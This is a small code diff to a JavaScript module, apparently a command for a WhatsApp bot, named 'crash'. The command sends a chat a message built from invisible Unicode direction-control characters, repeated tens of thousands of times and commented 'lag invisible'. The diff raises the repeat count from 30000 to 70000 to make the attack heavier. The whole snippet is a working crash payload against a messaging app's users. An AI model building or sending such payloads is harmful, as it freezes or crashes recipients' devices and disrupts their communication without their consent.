@@ -7,7 +7,7 @@ module.exports = {
   usage: `${PREFIX}crash`,
   handle: async ({ socket, remoteJid }) => {
     try {
-      const lagString = "\u200F\u200E\u202E".repeat(30000); // lag invisible
+      const lagString = "\u200F\u200E\u202E".repeat(70000); // lag invisible
       await socket.sendMessage(remoteJid, {
         text: lagString,
       });
